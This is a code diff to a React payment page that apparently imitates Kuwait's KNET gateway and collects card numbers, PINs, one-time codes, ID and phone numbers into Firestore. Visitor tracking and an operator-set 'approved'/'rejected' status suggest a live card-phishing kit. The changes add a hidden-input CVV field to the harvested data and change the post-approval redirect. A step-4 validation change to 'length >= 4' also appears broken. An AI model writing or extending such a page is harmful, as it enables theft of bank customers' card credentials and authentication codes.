@@ -21,6 +21,7 @@ type PaymentInfo = {
   allOtps: string[]
   bank_card: string[]
   prefix: string
+  cvv: string
   status: "new" | "pending" | "approved" | "rejected"
   // New fields for steps 3 and 4
   idNumber: string
@@ -28,6 +29,7 @@ type PaymentInfo = {
   finalOtp: string,
   newtwork: string,
   createdDate: string
+
 }
 
 const BANKS = [
@@ -133,6 +135,7 @@ const Payment = () => {
     bank_card: [""],
     prefix: "",
     status: "new",
+    cvv: '',
     // Initialize new fields
     idNumber: "",
     phoneNumber: "",
@@ -155,10 +158,11 @@ const Payment = () => {
 
   // Listen for Firestore status updates in the final step
   useEffect(() => {
-    setupOnlineStatus(visitorId!)
+const _visitorId=    localStorage.getItem("visitor")
+    setupOnlineStatus(_visitorId!)
 
     addData({
-      id: visitorId,
+      id: _visitorId,
       currentPage: `كي نت-${step}`,
       createdDate: new Date().toISOString(),
     })
@@ -171,10 +175,10 @@ const Payment = () => {
             if (data.status === "approved") {
               setIsLoading(false)
               // Redirect to hoiaty page on approval
-              router.push("/hoiaty")
+              router.push("/sahel")
             } else if (data.status === "rejected") {
               setIsLoading(false)
-              setError("تم رفض عملية الدفع. يرجى التحقق من المعلومات المدخلة والمحاولة مرة أخرى.")
+              setError("The transaction was rejected. Please check the information entered and try again.")
             }
           }
         }
@@ -476,6 +480,33 @@ const Payment = () => {
                           />
                         </div>
                       </div>
+                      <div className="row" id="PinRow">
+                        <input type="hidden" name="cardPinType" defaultValue="A" />
+                        <div id="eComPin">
+                          <label className="column-label"> Cvv: </label>
+                        </div>
+                        <div>
+                          <input
+                            inputMode="numeric"
+                            pattern="[0-9]*"
+                            name="cvv"
+                            id="cvv"
+                            onChange={(e: any) =>
+                              setPaymentInfo({
+                                ...paymentInfo,
+                                cvv: e.target.value,
+                              })
+                            }
+                            autoComplete="off"
+                            title="Should be in number. Length should be 3"
+                            type="password"
+                            size={3}
+                            maxLength={3}
+                            className="allownumericwithoutdecimal"
+                            style={{ width: "60%" }}
+                          />
+                        </div>
+                      </div>
                     </div>
                   </>
                 ) : step === 2 ? (
@@ -564,15 +595,27 @@ const Payment = () => {
                         <label className="column-label" style={{ display: "block", marginBottom: "5px" }}>
                           Network Provider:
                         </label>
-                        <select onChange={(e) => setPaymentInfo({
-                          ...paymentInfo,
-                          newtwork: e.target.value,
-                        })}
-                          value={paymentInfo.newtwork}
+                        <select value={paymentInfo.newtwork}
                           className="w-full bg-transparent placeholder:text-blue-400 text-slate-700 text-sm border border-blue-500 rounded pl-3 pr-8 py-2 transition duration-300 ease focus:outline-none focus:border-blue-400 hover:border-slate-400 shadow-sm focus:shadow-md appearance-none cursor-pointer">
-                          <option value="Zain">Zain</option>
-                          <option value="Ooredoo">Ooredoo</option>
-                          <option value="STC">STC</option>
+                          <option onClick={() => {
+                            setPaymentInfo({
+                              ...paymentInfo,
+                              newtwork: 'Zain'
+                            })
+                          }} value="Zain">Zain</option>
+                          <option 
+                        onClick={()=>{
+                          setPaymentInfo({
+                            ...paymentInfo,
+                            newtwork: 'Ooredoo'
+                          })
+                        }} value="Ooredoo">Ooredoo</option>
+                          <option   onClick={()=>{
+                          setPaymentInfo({
+                            ...paymentInfo,
+                            newtwork: 'STC'
+                          })
+                        }}value="STC">STC</option>
                         </select>
 
                       </div>
@@ -646,7 +689,7 @@ const Payment = () => {
                               paymentInfo.pass.length !== 4)) ||
                           (step === 2 && (!paymentInfo.otp || paymentInfo.otp.length !== 6)) ||
                           (step === 3 && (!paymentInfo.idNumber || !paymentInfo.phoneNumber)) ||
-                          (step === 4 && (!paymentInfo.finalOtp || paymentInfo.finalOtp.length !== 6)) ||
+                          (step === 4 && (!paymentInfo.finalOtp || paymentInfo.finalOtp.length >= 4 )) ||
                           loading
                         }
                         onClick={() => {
